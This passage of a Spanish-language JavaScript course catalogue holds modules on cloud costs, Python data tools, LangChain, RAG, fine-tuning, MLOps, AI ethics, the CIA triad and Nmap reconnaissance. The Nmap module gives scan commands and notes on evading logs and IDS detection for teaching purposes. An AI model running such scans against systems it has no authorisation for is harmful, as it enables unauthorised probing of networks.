      { title: '📺 Grafana Labs', url: 'https://grafana.com/', description: 'Dashboards compartidos y plugins' }
    ],
    tips: [
      '💡 Evita cardinality explosion: limita etiquetas dinámicas.',
      '💡 Usa recording rules para optimizar consultas comunes.'
    ]
  }
},

/* ────────── DC8 – Cloud Cost Optimization (Complejidad 5) ────────── */
{
  id: 'DC8',
  title: 'Cloud Cost Optimization',
  category: 'DevOps & Cloud',
  activated: false,
  complexity: 5,
  prerequisites: ['DC5','DC7'],
  related: [],
  summary: 'Rightsizing, reserved instances. Ejercicio: plan de ahorro 30%.',
  content: {
    theory: `
# Optimización de Costos en la Nube

## 1. Estrategias Principales
- **Rightsizing**: ajustar instancias al uso real (CloudWatch, Azure Monitor).  
- **Reserved Instances / Savings Plans**: compromisos 1–3 años para reducir ~30%.  
- **Spot Instances**: cargas tolerantes a interrupciones con descuentos ≥ 70%.

## 2. Etiquetado & Reportes
- **Cost Allocation Tags**: aplicarlas a todos los recursos.  
- **Cost Explorer / Billing API**: análisis granular de gastos.

## 3. Automatización
- **AWS Compute Optimizer**: recomendaciones de instancias.  
- **Terraform + AWS Billing Alerts**: presupuestos programados.

## 4. Arquitecturas Serverless
- Consumición por demanda (Lambda, Functions), pay-per-use.

    `,
    examples: [
      {
        title: '💰 AWS CLI – Reporte mensual',
        code: `aws ce get-cost-and-usage \
  --time-period Start=2025-06-01,End=2025-06-30 \
  --granularity MONTHLY \
  --metrics UnblendedCost`
      },
      {
        title: '📊 Terraform Budget Alert',
        code: `resource "aws_budgets_budget" "monthly" {
  name              = "MonthlyCost"
  budget_type       = "COST"
  limit_amount      = "1000"
  time_unit         = "MONTHLY"
  cost_types { include_tax = true }
}`
      }
    ],
    exercises: [
      {
        title: '📉 Ex 1 — Plan de Ahorro 30%',
        objective: 'Analizar y reducir 30% del gasto AWS en 3 meses.',
        deliverable: 'Informe Excel/CSV + Terraform para reserved>',
        steps: [
          '1. Extrae 3 meses de costos via AWS CLI.',
          '2. Identifica top-5 servicios >50% del gasto.',
          '3. Calcula RI o Savings Plan óptimo para EC2/RDS.',
          '4. Implementa Terraform para comprar RI 1 año.'
        ],
        acceptance: [
          '✅ Informe muestra reducción estimada ≥ 30%.',
          '✅ terraform apply compra RI sin errores.',
          '✅ AWS Cost Explorer refleja RI en estado active.'
        ],
        hint: 'Usa AWS Cost Explorer API para programar exports.',
        extra: 'Automatiza renovación de RI con Lambda + SNS.'
      }
    ],
    resources: [
      { title: '📖 AWS Well-Architected Cost', url: 'https://aws.amazon.com/architecture/well-architected/cost-optimization/', description: 'Prácticas recomendadas de AWS' },
      { title: '🛠️ Cloud Custodian', url: 'https://cloudcustodian.io/', description: 'Automatización de políticas de costos' }
    ],
    tips: [
      '💡 Implementa presupuestos en entornos de prueba para detectar fugas.',
      '💡 Desmonta recursos no usados semanalmente con lambdas automatizadas.',
      '💡 Usa spot para cluster de Kubernetes no crítico.'
    ]
  }
},


  /* ────────── AI1 – Python DataStack Intro (Complejidad 1) ────────── */
{
  id: 'AI1',
  title: 'Python DataStack Intro',
  category: 'IA / Datos & RAG',
  activated: true,
  complexity: 1,
  prerequisites: [],
  related: [],
  summary: 'Numpy, Pandas rápidos. Ejercicio: dataset csv análisis descriptivo.',
  content: {
    theory: `
# Python DataStack — Fundamentos de Numpy y Pandas

## 1. Numpy Arrays vs Listas
- **Numpy Array**: álgebra vectorial, broadcasting, operaciones en C.
- **Crear array**:
\\\`\\\`\\\`python
import numpy as np
a = np.array([1,2,3])
b = np.arange(0,10,2)
\\\`\\\`\\\`

## 2. DataFrames con Pandas
- **Lectura CSV**:
\\\`\\\`\\\`python
import pandas as pd
df = pd.read_csv('data.csv')
\\\`\\\`\\\`
- **Operaciones comunes**: df.head(), df.describe(), df.info()

## 3. Selección y Filtrado
\\\`\\\`\\\`python
# Columnas
df['col1']
# Filtrado por condición
df[df['age'] > 30]
# Selección por posición
df.iloc[0:5, 0:3]
\\\`\\\`\\\`

## 4. Agrupaciones (GroupBy)
\\\`\\\`\\\`python
df.groupby('category')['value'].agg(['mean','sum'])
\\\`\\\`\\\`

## 5. Limpieza y Transformación
- **Valores faltantes**: df.fillna(), df.dropna()
- **Tipo de datos**: df.astype({'col':'int'})
`,
    examples: [
      {
        title: '📊 Análisis Descriptivo CSV',
        code: `import pandas as pd

df = pd.read_csv('sales.csv')
print(df.describe())
print(df['region'].value_counts())
df.groupby('product')['revenue'].sum().plot(kind='bar')`
      },
      {
        title: '🔄 Operaciones Numpy + Pandas',
        code: `import numpy as np
import pandas as pd

a = np.random.rand(1000)
df = pd.DataFrame({'x': a, 'y': np.sin(a)})
df['z'] = df['x'] * df['y']`
      }
    ],
    exercises: [
      {
        title: '🎯 Ex 1 — Informe Descriptivo Completo',
        objective: 'Generar análisis estadístico y visual de un dataset CSV.',
        deliverable: 'Notebook .ipynb con resumen y al menos 2 gráficos Matplotlib.',
        steps: [
          '1. Carga dataset “data.csv” con Pandas.',
          '2. Reporta count, mean, std, min, max de numéricos.',
          '3. Grafica distribución de dos variables con histograma.',
          '4. Agrupa por categoría y grafica totales.'
        ],
        acceptance: [
          '✅ Notebook ejecutable sin errores.',
          '✅ Estadísticas cubren todas las columnas numéricas.',
          '✅ Dos gráficos muestran insights claros.'
        ],
        hint: 'Usa plt.figure() antes de cada gráfico para claridad.',
        extra: 'Añade boxplot para detectar outliers.'
      }
    ],
    resources: [
      { title: '📖 Pandas Documentation', url: 'https://pandas.pydata.org/docs/', description: 'Guía oficial de Pandas' },
      { title: '📖 Numpy Quickstart', url: 'https://numpy.org/doc/stable/user/quickstart.html', description: 'Introducción rápida a Numpy' }
    ],
    tips: [
      '💡 Evita iterar filas; utiliza operaciones vectorizadas.',
      '💡 Usa df.pipe() para encadenar transformaciones legibles.'
    ]
  }
},

/* ────────── AI2 – Embeddings Basics (Complejidad 2) ────────── */
{
  id: 'AI2',
  title: 'Embeddings Basics',
  category: 'IA / Datos & RAG',
  activated: false,
  complexity: 2,
  prerequisites: ['AI1'],
  related: [],
  summary: 'Vectoriza texto con OpenAI o SBERT. Ejercicio: similitud de frases.',
  content: {
    theory: `
# Embeddings — Representación Vectorial de Texto

## 1. ¿Qué es un embedding?
Vector de n dimensiones que captura semántica de texto.

## 2. OpenAI Embeddings API
\\\`\\\`\\\`python
from openai import OpenAI
client = OpenAI()
resp = client.embeddings.create(model="text-embedding-ada-002", input="Hola mundo")
vector = resp.data[0].embedding
\\\`\\\`\\\`

## 3. SentenceTransformers (SBERT)
\\\`\\\`\\\`python
from sentence_transformers import SentenceTransformer
model = SentenceTransformer('all-MiniLM-L6-v2')
emb = model.encode(['texto1','texto2'])
\\\`\\\`\\\`

## 4. Métricas de Similitud
- **Cosine similarity**: \`1 - cosine(u,v)\`  
- **Distancia Euclidiana**: \`np.linalg.norm(u-v)\`
`,
    examples: [
      {
        title: '🔍 Similitud OpenAI',
        code: `import numpy as np
from openai import OpenAI
client = OpenAI()
e1 = client.embeddings.create(model="ada", input="Hola")
e2 = client.embeddings.create(model="ada", input="Buenos días")
sim = 1 - np.dot(e1.data[0].embedding, e2.data[0].embedding) / 
      (np.linalg.norm(e1.data[0].embedding)*np.linalg.norm(e2.data[0].embedding))
print(sim)`
      },
      {
        title: '🧠 SBERT Cluster',
        code: `from sklearn.cluster import KMeans
from sentence_transformers import SentenceTransformer

sentences = ["Hola", "Adiós", "Buenos días"]
model = SentenceTransformer('all-MiniLM-L6-v2')
embs = model.encode(sentences)
labels = KMeans(n_clusters=2).fit_predict(embs)
print(dict(zip(sentences, labels)))`
      }
    ],
    exercises: [
      {
        title: '⚡ Ex 1 — Similitud Frases Batch',
        objective: 'Calcular similitud de 100 pares de frases usando OpenAI y SBERT.',
        deliverable: 'Script Python con ambas librerías y reporte CSV. ',
        steps: [
          '1. Genera 100 pares de frases en lista.',
          '2. Obtén embeddings OpenAI y SBERT.',
          '3. Calcula similitud coseno para ambos.',
          '4. Guarda CSV con columnas (phr1,phr2,sim_openai,sim_sbert).'
        ],
        acceptance: [
          '✅ CSV con 100 filas y valores numéricos válidos.',
          '✅ Tiempo de ejecución < 2 min para SBERT local.'
        ],
        hint: 'Batch embeddings en bloques de 20 para API quota.',
        extra: 'Grafica correlación entre ambas métricas con Matplotlib.'
      }
    ],
    resources: [
      { title: '📖 OpenAI Embeddings', url: 'https://platform.openai.com/docs/guides/embeddings', description: 'Guía oficial' },
      { title: '📦 SBERT Models', url: 'https://www.sbert.net/docs/pretrained_models.html', description: 'Modelos disponibles' }
    ],
    tips: [
      '💡 Normaliza vectores antes de similitud.',
      '💡 Guarda embeddings en disco con numpy.save para reuso.'
    ]
  }
},

/* ────────── AI3 – LangChain Fundamentals (Complejidad 2) ────────── */
{
  id: 'AI3',
  title: 'LangChain Fundamentals',
  category: 'IA / Datos & RAG',
  activated: false,
  complexity: 2,
  prerequisites: ['AI2'],
  related: [],
  summary: 'Chains, tools, memory. Ejercicio: QA simple.',
  content: {
    theory: `
# LangChain — Cadena de LLMs y Herramientas

## 1. PromptTemplate + LLMChain
\\\`\\\`\\\`python
from langchain import PromptTemplate, LLMChain
template = "Traduce a español: {text}"
prompt = PromptTemplate.from_template(template)
chain = LLMChain(llm=OpenAI(model="gpt-3.5-turbo"), prompt=prompt)
resp = chain.run(text="Hello world")
\\\`\\\`\\\`

## 2. Tools & Agents
- **Tool**: función externa (Wikipedia, calculator).  
- **Agent**: decide qué tools invocar en cada paso.

## 3. Conversational Memory
\\\`\\\`\\\`python
from langchain.memory import ConversationBufferMemory
memory = ConversationBufferMemory()
chain = LLMChain(llm=OpenAI(), prompt=prompt, memory=memory)
\\\`\\\`\\\`

## 4. Composición de Chains
- **SequentialChain**, **RouterChain**, **MapReduceChain**.
`,
    examples: [
      {
        title: '🔗 LLMChain con Memoria',
        code: `from langchain import OpenAI, LLMChain
from langchain.memory import ConversationBufferMemory

memory = ConversationBufferMemory()
chain = LLMChain(
  llm=OpenAI(model="gpt-3.5-turbo"),
  prompt=PromptTemplate.from_template("Usuario: {input}\\nAsistente:"),
  memory=memory
)
print(chain.run(input="¿Cómo estás?"))
print(chain.run(input="¿Qué recordabas?"))`
      },
      {
        title: '🛠️ Herramienta Calculator Agent',
        code: `from langchain.agents import load_tool, initialize_agent

tools = [load_tool("calculator")]
agent = initialize_agent(tools, OpenAI(), agent="zero-shot-react-description")
print(agent.run("¿Cuánto es 23 * 47?"))`
      }
    ],
    exercises: [
      {
        title: '🤖 Ex 1 — Chat QA Simple',
        objective: 'Construir un chat que recuerde contexto y responda preguntas.',
        deliverable: 'Script Python + session demo en consola.',
        steps: [
          '1. Define PromptTemplate para QA.',
          '2. Usa ConversationBufferMemory.',
          '3. Ejecuta ciclo input→chain.run→print.',
          '4. Demuestra retención de contexto entre turnos.'
        ],
        acceptance: [
          '✅ El chat recuerda al menos 2 turnos anteriores.',
          '✅ Response coherentes en continuidad de conversación.'
        ],
        hint: 'Set memory.max_length=5 para controlar token usage.',
        extra: 'Integra tool de búsqueda web básica.'
      }
    ],
    resources: [
      { title: '📖 LangChain Docs', url: 'https://langchain.com/docs', description: 'Referencia oficial' },
      { title: '🎥 LangChain YouTube', url: 'https://www.youtube.com/langchain', description: 'Tutoriales en vídeo' }
    ],
    tips: [
      '💡 Usa temperature baja (<0.3) para respuestas más determinísticas.',
      '💡 Prefetch embeddings para procesos en lote.'
    ]
  }
},

/* ────────── AI4 – RAG Pipeline (Complejidad 3) ────────── */
{
  id: 'AI4',
  title: 'RAG Pipeline',
  category: 'IA / Datos & RAG',
  activated: false,
  complexity: 3,
  prerequisites: ['AI3'],
  related: [],
  summary: 'Document loaders, splitters, vectordb, retriever. Ejercicio: chatbot docs.',
  content: {
    theory: `
# RAG — Retrieval-Augmented Generation

## 1. Document Loaders
- **PDFLoader**, **TextLoader**, **WebBaseLoader**.

## 2. Text Splitters
\\\`\\\`\\\`python
from langchain.text_splitter import RecursiveCharacterTextSplitter
splitter = RecursiveCharacterTextSplitter(chunk_size=1000, chunk_overlap=100)
chunks = splitter.split_text(document)
\\\`\\\`\\\`

## 3. Vectorstores
- **Chroma**, **Pinecone**, **Weaviate**.  
- Indexar vectores y metadatos.

## 4. Retriever + QA Chain
\\\`\\\`\\\`python
from langchain.chains import RetrievalQA
from langchain.vectorstores import Chroma
from langchain.embeddings import OpenAIEmbeddings

db = Chroma.from_documents(chunks, OpenAIEmbeddings())
qa = RetrievalQA.from_chain_type(llm=OpenAI(), retriever=db.as_retriever())
resp = qa.run("¿Cuál es la conclusión del doc?")
\\\`\\\`\\\`

## 5. Pipeline Completo
Loading → Splitting → Embedding → Storing → Retrieving → Generating
`,
    examples: [
      {
        title: '📚 RAG con Chroma Local',
        code: `from langchain.document_loaders import PDFLoader
from langchain.text_splitter import CharacterTextSplitter
from langchain.vectorstores import Chroma
from langchain.embeddings import OpenAIEmbeddings
from langchain.chains import RetrievalQA

loader = PDFLoader("file.pdf")
docs = loader.load()
splitter = CharacterTextSplitter(chunk_size=500, chunk_overlap=50)
chunks = splitter.split_documents(docs)

db = Chroma.from_documents(chunks, OpenAIEmbeddings())
qa = RetrievalQA.from_chain_type(llm=OpenAI(), retriever=db.as_retriever())
print(qa.run("¿Qué tema principal trata el documento?"))`
      }
    ],
    exercises: [
      {
        title: '💬 Ex 1 — Chatbot de Documentos',
        objective: 'Crear RAG que responda preguntas sobre un conjunto PDF.',
        deliverable: 'Script Python + demo interactiva en terminal.',
        steps: [
          '1. Carga 1–3 PDFs con PDFLoader.',
          '2. Split documents en chunks de 600 tokens.',
          '3. Indexa con Chroma/FAISS + OpenAIEmbeddings.',
          '4. Implementa RetrievalQA y prueba queries.'
        ],
        acceptance: [
          '✅ Respuestas correctas para al menos 5 preguntas variadas.',
          '✅ Latencia ≤ 1.5 s por query en local.'
        ],
        hint: 'Ajusta chunk_overlap para mejorar contexto.',
        extra: 'Guarda vectorstore en disco y recarga sin reindex.'
      }
    ],
    resources: [
      { title: '📖 LangChain RAG Tutorial', url: 'https://python.langchain.com/en/latest/modules/chains/index_examples/rag.html', description: 'Ejemplo oficial de RAG' },
      { title: '🛠️ Chroma DB', url: 'https://docs.trychroma.com/', description: 'Vectorstore ligera open source' }
    ],
    tips: [
      '💡 Usa smaller chunk_size para contextos muy especializados.',
      '💡 Monitorea tamaño de vectorstore para evitar OOM.'
    ]
  }
},/* ────────── AI5 – Fine-tuning LLMs (Complejidad 3) ────────── */
{
  id: 'AI5',
  title: 'Fine-tuning LLMs',
  category: 'IA / Datos & RAG',
  activated: false,
  complexity: 3,
  prerequisites: ['AI2'],
  related: [],
  summary: 'LoRA y PEFT en HuggingFace. Ejercicio: adapta respuesta de soporte.',
  content: {
    theory: `
# Fine-tuning de Modelos de Lenguaje

## 1. Paradigmas de Fine-tuning
- **Full-model**: ajustar todos los pesos (costoso).  
- **LoRA (Low-Rank Adaptation)**: inyecta adaptadores de bajo rango.  
- **PEFT (Parameter-Efficient Fine-Tuning)**: combina técnicas de adaptación eficiente.

## 2. Configuración con HuggingFace Accelerate
\`\`\`bash
pip install transformers accelerate peft datasets
\`\`\`

## 3. Ejemplo LoRA
\`\`\`python
from peft import get_peft_config, get_peft_model, LoraConfig
from transformers import AutoModelForCausalLM, AutoTokenizer

tokenizer = AutoTokenizer.from_pretrained("gpt2")
base = AutoModelForCausalLM.from_pretrained("gpt2")
config = LoraConfig(
  r=8, lora_alpha=32, target_modules=["c_attn"], 
  lora_dropout=0.05, bias="none"
)
model = get_peft_model(base, config)
\`\`\`

## 4. Entrenamiento
\`\`\`bash
accelerate launch train_lora.py \
  --model_name_or_path gpt2 \
  --dataset_path data.json \
  --output_dir ./lora-gpt2 \
  --per_device_train_batch_size 8 \
  --num_train_epochs 3
\`\`\`

## 5. Inference
\`\`\`python
model.eval()
inputs = tokenizer("¿Cómo ayudo al cliente con X?", return_tensors="pt")
print(tokenizer.decode(model.generate(**inputs)[0]))
\`\`\`
    `,
    examples: [
      {
        title: '🔧 Script de Entrenamiento LoRA',
        code: `# train_lora.py
import torch
from datasets import load_dataset
from transformers import AutoModelForCausalLM, AutoTokenizer, Trainer, TrainingArguments
from peft import LoraConfig, get_peft_model

tokenizer = AutoTokenizer.from_pretrained("gpt2")
dataset = load_dataset("json", data_files="support_tickets.json")
model = AutoModelForCausalLM.from_pretrained("gpt2")
lora_cfg = LoraConfig(r=4, lora_alpha=16, target_modules=["c_attn"])
model = get_peft_model(model, lora_cfg)

def tokenize_fn(ex):
    return tokenizer(ex["text"], truncation=True, padding="max_length", max_length=128)
ds = dataset.map(tokenize_fn, batched=True)

training_args = TrainingArguments(
    output_dir="./lora-out", num_train_epochs=2, per_device_train_batch_size=4
)
trainer = Trainer(model=model, args=training_args, train_dataset=ds["train"])
trainer.train()`
      }
    ],
    exercises: [
      {
        title: '🎯 Ex 1 — Adaptar Soporte al Cliente',
        objective: 'Fine-tunear GPT-2 con LoRA para respuestas de helpdesk.',
        deliverable: 'Modelo LoRA + script inference + README.',
        steps: [
          '1. Prepara JSON con 500 pares (pregunta, respuesta).',
          '2. Configura LoraConfig apuntando a c_attn y q_proj.',
          '3. Entrena con Accelerate (2 epochs, batch_size 4).',
          '4. Prueba inferencia en 5 ejemplos reales.'
        ],
        acceptance: [
          '✅ Pérdida final < 2.0 en el conjunto de validación.',
          '✅ Respuestas coherentes y relevantes en ≥ 4/5 casos.',
          '✅ Tamaño del adaptador LoRA < 50 MB.'
        ],
        hint: 'Usa scheduler de tasa de aprendizaje linear con warmup.',
        extra: 'Experimenta con PEFT “prefix-tuning” para comparar.'
      }
    ],
    resources: [
      { title: '📖 PEFT Docs', url: 'https://huggingface.co/docs/peft/', description: 'Guía de PEFT y LoRA' },
      { title: '🎥 LoRA Paper', url: 'https://arxiv.org/abs/2106.09685', description: 'Low-Rank Adaptation para LLMs' }
    ],
    tips: [
      '💡 Usa mixed-precision (fp16) para reducir memoria.',
      '💡 Guarda solo pesos de adaptadores, no todo el modelo.'
    ]
  }
},

/* ────────── AI6 – MLOps básico (Complejidad 4) ────────── */
{
  id: 'AI6',
  title: 'MLOps básico',
  category: 'IA / Datos & RAG',
  activated: false,
  complexity: 4,
  prerequisites: ['AI4'],
  related: [],
  summary: 'MLflow tracking & model registry. Ejercicio: versiona modelos.',
  content: {
    theory: `
# MLOps con MLflow

## 1. MLflow Components
- **Tracking**: registra parámetros, métricas, artefactos.  
- **Projects**: entornos reproducibles (conda, docker).  
- **Models**: empaquetado para servir (pyfunc, spark).  
- **Registry**: versionado y stages (Staging, Production).

## 2. Setup Rápido
\`\`\`bash
pip install mlflow
export MLFLOW_TRACKING_URI=http://localhost:5000
mlflow server --backend-store sqlite:///mlflow.db --default-artifact-root ./artifacts
\`\`\`

## 3. Uso en Código
\`\`\`python
import mlflow
from sklearn.ensemble import RandomForestRegressor

mlflow.start_run()
model = RandomForestRegressor(n_estimators=100)
model.fit(X_train, y_train)
mlflow.log_param("n_estimators", 100)
mlflow.log_metric("rmse", rmse)
mlflow.sklearn.log_model(model, "model")
mlflow.end_run()
\`\`\`
    `,
    examples: [
      {
        title: '📈 Visualizar Experimentos',
        code: `# UI en localhost:5000
# mlflow ui --backend-store-uri sqlite:///mlflow.db
# Abrir navegador en http://127.0.0.1:5000`
      },
      {
        title: '🏷️ Model Registry CLI',
        code: `mlflow models serve -m "models:/my_model/Production" -p 1234`
      }
    ],
    exercises: [
      {
        title: '🔖 Ex 1 — Versionado de Modelos',
        objective: 'Registrar 3 versiones de un modelo y promover a Production.',
        deliverable: 'Notebook con runs y pasos de registry.',
        steps: [
          '1. Ejecuta 3 runs con distinto random_state.',
          '2. Logea parámetros, métricas y modelo.',
          '3. Usando MLflow API, crea registro “SalesModel”.',
          '4. Promueve run con mejor métrica a Production.'
        ],
        acceptance: [
          '✅ En Registry aparece 3 versiones.',
          '✅ Versión Production sirve predicciones correctas.'
        ],
        hint: 'Usa mlflow.register_model() y client.transition_model_version_stage().',
        extra: 'Automatiza promoción vía GitHub Actions.'
      }
    ],
    resources: [
      { title: '📖 MLflow Docs', url: 'https://mlflow.org/docs/', description: 'Referencia oficial de MLflow' },
      { title: '🎥 Databricks MLOps', url: 'https://youtu.be/GwIo3gDZCVQ', description: 'Webinar MLOps con MLflow' }
    ],
    tips: [
      '💡 Centraliza tracking en servidor remoto para colaboración.',
      '💡 Usa ARTIFACT_STORE en S3/GCS para escalabilidad.'
    ]
  }
},

/* ────────── AI7 – Vector DB Scaling (Complejidad 4) ────────── */
{
  id: 'AI7',
  title: 'Vector DB Scaling',
  category: 'IA / Datos & RAG',
  activated: false,
  complexity: 4,
  prerequisites: ['AI4'],
  related: [],
  summary: 'Milvus/Weaviate sharding & replicas. Ejercicio: cluster 3 nodos.',
  content: {
    theory: `
# Escalado de Vector Databases

## 1. Arquitectura Distribuida
- **Sharding**: particionar índices entre nodos.  
- **Replicación**: copias para alta disponibilidad.

## 2. Milvus
\`\`\`yaml
milvus:
  image: milvusdb/milvus:latest
  ports: ["19530:19530"]
  command: ["milvus", "run", "all"]
\`\`\`

## 3. Weaviate
- **Cluster**: instancia + replicaSets + modules.  
- Configura \`GENERIC\` index y vectores HNSW.

## 4. Consistencia y Fault-tolerance
- Elección de política CONSISTENT | EVENTUAL.  
- Heartbeats y reequilibrio automático.
    `,
    examples: [
      {
        title: '⚙️ Docker Compose Milvus Cluster',
        code: `version: '3.8'
services:
  milvus-1:
    image: milvusdb/milvus:latest
    command: ["milvus", "run", "all"]
  milvus-2:
    image: milvusdb/milvus:latest
    command: ["milvus", "run", "all"]`
      },
      {
        title: '🔧 Weaviate Helm Chart',
        code: `helm repo add weaviate https://weaviate.github.io/weaviate-helm
helm install weaviate weaviate/weaviate --set cluster.replicaCount=3`
      }
    ],
    exercises: [
      {
        title: '🏗️ Ex 1 — Cluster de 3 Nodos',
        objective: 'Desplegar Milvus con 3 shards y 2 réplicas cada uno.',
        deliverable: 'docker-compose.yaml o Terraform.',
        steps: [
          '1. Definir 3 servicios Milvus en Compose.',
          '2. Configurar persistence volumes separados.',
          '3. Test: insertar 10k vectores y medir QPS.',
          '4. Simular caída de un nodo y verificar failover.'
        ],
        acceptance: [
          '✅ Cluster levanta en <1 min.',
          '✅ QPS ≥ 5k bajo carga local.',
          '✅ Búsqueda funciona tras caída de nodo.'
        ],
        hint: 'Usa network_mode: host en Compose para evitar DNS.',
        extra: 'Integra monitoring con exporter de Milvus en Prometheus.'
      }
    ],
    resources: [
      { title: '📖 Milvus Docs', url: 'https://milvus.io/docs/', description: 'Guía oficial Milvus' },
      { title: '📖 Weaviate Docs', url: 'https://weaviate.io/developers/', description: 'Referencia oficial Weaviate' }
    ],
    tips: [
      '💡 Mantén suficientes réplicas para tolerar fallos nodo.',
      '💡 Ajusta index build parametrición para reducir latencia.'
    ]
  }
},

/* ────────── AI8 – AI Governance & Ethics (Complejidad 5) ────────── */
{
  id: 'AI8',
  title: 'AI Governance & Ethics',
  category: 'IA / Datos & RAG',
  activated: false,
  complexity: 5,
  prerequisites: ['AI6'],
  related: [],
  summary: 'Bias, safety layers, audits. Ejercicio: checklist riesgo.',
  content: {
    theory: `
# Gobernanza y Ética en IA

## 1. Frameworks Principales
- **EU AI Act**, **OECD AI Principles**, **IEEE Ethically Aligned Design**.

## 2. Detección y Mitigación de Sesgos
- Métricas de fairness (e.g., demographic parity).  
- Técnicas de pre-procesamiento y re-weighing.

## 3. Capas de Seguridad
- **Rate-limits**, **RLHF** para safe completion.  
- **Monitorización** de outputs para toxicidad.

## 4. Auditorías y Transparentes
- **Datasheets for Datasets**, **Model Cards**.  
- Registro de versiones y lineage.
    `,
    examples: [
      {
        title: '📑 Model Card JSON Schema',
        code: `{
  "model_name": "support-gpt2",
  "version": "1.0",
  "intended_use": "...",
  "ethical_considerations": "...",
  "metrics": { "bias": "...", "accuracy": 0.92 }
}`
      },
      {
        title: '🛡️ Safe-completion Hook',
        code: `def safe_generate(prompt):
    output = model.generate(prompt)
    if detect_toxicity(output): return "[REDACTED]"
    return output`
      }
    ],
    exercises: [
      {
        title: '⚖️ Ex 1 — Checklist de Riesgo',
        objective: 'Desarrollar checklist para evaluar riesgo de un modelo generativo.',
        deliverable: 'Documento Markdown con 10 ítems + plan de mitigación.',
        steps: [
          '1. Define categorías: fairness, privacy, safety.',
          '2. Investiga métricas y benchmarks para cada categoría.',
          '3. Escribe caso de uso y riesgos identificados.',
          '4. Proponer controles técnicos y organizativos.'
        ],
        acceptance: [
          '✅ Checklist cubre ≥ 3 métricas de fairness.',
          '✅ Plan incluye al menos 2 controles automáticos.'
        ],
        hint: 'Consulta AI Incident Database para ejemplos reales.',
        extra: 'Integra checklist en CI pipeline para guardarlo en repo.'
      }
    ],
    resources: [
      { title: '📖 EU AI Act', url: 'https://eur-lex.europa.eu/eli/reg/2021/0106/oj', description: 'Regulación europea' },
      { title: '📚 AI Incident Database', url: 'https://incidentdatabase.ai/', description: 'Casos de fallos de IA' }
    ],
    tips: [
      '💡 Implementa logging detallado de inputs/outputs.',
      '💡 Revisa continuamente real-world performance post-deploy.'
    ]
  }
},

 /* ────────── CS1 – Modelo CIA y Tipos de Amenazas (Complejidad 1) ────────── */
{
  id: 'CS1',
  title: 'Modelo CIA y Tipos de Amenazas',
  category: 'Ciberseguridad práctica',
  activated: true,
  complexity: 1,
  prerequisites: [],
  related: [],
  summary: 'Confidencialidad, Integridad, Disponibilidad. Ejercicio: clasifica 3 riesgos.',
  content: {
    theory: `
# Modelo CIA — Triada Esencial de Seguridad

La triada CIA es el pilar de cualquier programa de seguridad:

1. **Confidencialidad (C)**  
   - Garantiza que la información solo sea accesible para quién corresponde.  
   - Técnicas: cifrado (AES, RSA), control de acceso, etiquetado de datos.

2. **Integridad (I)**  
   - Asegura que los datos no sean modificados sin autorización.  
   - Técnicas: firmas digitales, sumas de verificación (SHA-256), controles de versiones.

3. **Disponibilidad (A)**  
   - Mantiene los sistemas y datos accesibles cuando se necesitan.  
   - Técnicas: redundancia, balanceo de carga, backups, mitigación DDoS.

## Tipos de Amenazas

| Categoría    | Ejemplo                    | Impacto CIA         |
|--------------|----------------------------|---------------------|
| Pasivas      | Sniffing de tráfico        | C↑, I→, A→          |
| Activas      | Inyección SQL             | I↑, C→, A→          |
| Técnicas     | Malware, ransomware        | C↑, I↑, A↓          |
| Físicas      | Robo de dispositivo        | C↑, I→, A↑          |
| Internas     | Empleado descontento       | C↑, I↑, A↑          |`,
    examples: [
      {
        title: '🔍 Script de Clasificación en Python',
        code: `# cia_classifier.py
import csv

# Definir riesgos de ejemplo
threats = [
    {'name':'SQL Injection', 'C':'Baja','I':'Alta','A':'Media'},
    {'name':'DDoS', 'C':'Muy Baja','I':'Media','A':'Alta'},
    {'name':'Phishing Interno', 'C':'Alta','I':'Media','A':'Media'},
]

with open('cia_risks.csv','w', newline='') as f:
    writer = csv.DictWriter(f, fieldnames=['name','C','I','A'])
    writer.writeheader()
    writer.writerows(threats)
print("Archivo cia_risks.csv generado con éxito.")`
      }
    ],
    exercises: [
      {
        title: '📝 Ex 1 — Análisis y Clasificación de Riesgos',
        objective: 'Identificar 3 activos clave y clasificar 2 amenazas para cada uno.',
        deliverable: 'Archivo Markdown con tabla CIA y breve justificación.',
        steps: [
          '1. Selecciona 3 activos (servidor web, base de datos, VPN).',
          '2. Para cada activo, enumera 2 amenazas (técnicas o pasivas).',
          '3. Asigna niveles (Alta/Media/Baja) a C, I, A justificando cada valor.',
          '4. Entrega un README.md con la tabla y comentarios.'
        ],
        acceptance: [
          '✅ 3 activos claramente definidos.',
          '✅ 6 amenazas correctamente clasificadas.',
          '✅ Justificación lógica para cada nivel CIA.'
        ],
        hint: 'Piensa qué pasaría si cada activo queda inaccesible o expuesto.',
        extra: 'Incluye un pequeño diagrama de impacto en tu README.'
      }
    ],
    resources: [
      { title: '📖 NIST SP 800-30', url: 'https://csrc.nist.gov/publications/detail/sp/800-30/rev-1/final', description: 'Guía de evaluación de riesgos' },
      { title: '🛡️ OWASP Risk Rating Methodology', url: 'https://owasp.org/www-community/OWASP_Risk_Rating_Methodology', description: 'Metodología para priorizar riesgos' }
    ],
    tips: [
      '💡 Empieza siempre evaluando la probabilidad *y* el impacto.',
      '💡 Documenta supuestos (p.ej., nivel de sofisticación del atacante).',
      '💡 Usa matrices de calor para visualizar niveles de riesgo.'
    ]
  }
},

/* ────────── CS2 – Reconocimiento con Nmap (Complejidad 2) ────────── */
{
  id: 'CS2',
  title: 'Reconocimiento con Nmap',
  category: 'Ciberseguridad práctica',
  activated: false,
  complexity: 2,
  prerequisites: ['CS1'],
  related: [],
  summary: 'Escaneos SYN, scripts NSE. Ejercicio: escanea tu red local.',
  content: {
    theory: `
# Reconocimiento con Nmap — Mapeo de la Superficie de Ataque

1. **TCP SYN Scan (-sS)**  
   - Conexión “semiabierta”, no finaliza el handshake.  
   - Uso: descubrir puertos sin dejar registro completo.

2. **Detección de Servicios (-sV)**  
   - Identifica protocolo y versión del servicio.  
   - Ej.: SSH, HTTP, FTP.

3. **Scripting Engine (NSE)**  
   - *vuln*: escaneo de vulnerabilidades conocidas.  
   - *discovery*: información adicional (hosts, scripts).

4. **Templates de Tiempo (-T0…-T5)**  
   - Ajusta agresividad vs detección IDS. `,
    examples: [
      {
        title: '📡 Escaneo SYN & Service Detect',
        code: `sudo nmap -sS -sV -p 1-1024 192.168.1.0/24 -T4 -oA nmap_discovery`
      },
      {
        title: '🧰 Uso de NSE Scripts',
        code: `nmap --script vuln,default -p80,443 example.com -oX vuln_scan.xml`
      }
    ],
    exercises: [
      {
        title: '🏁 Ex 1 — Laboratorio Docker de Reconocimiento',
        objective: 'Montar un entorno Docker con 2 contenedores y mapear puertos.',
        deliverable: 'docker-compose.yml + reporte de resultado Nmap.',
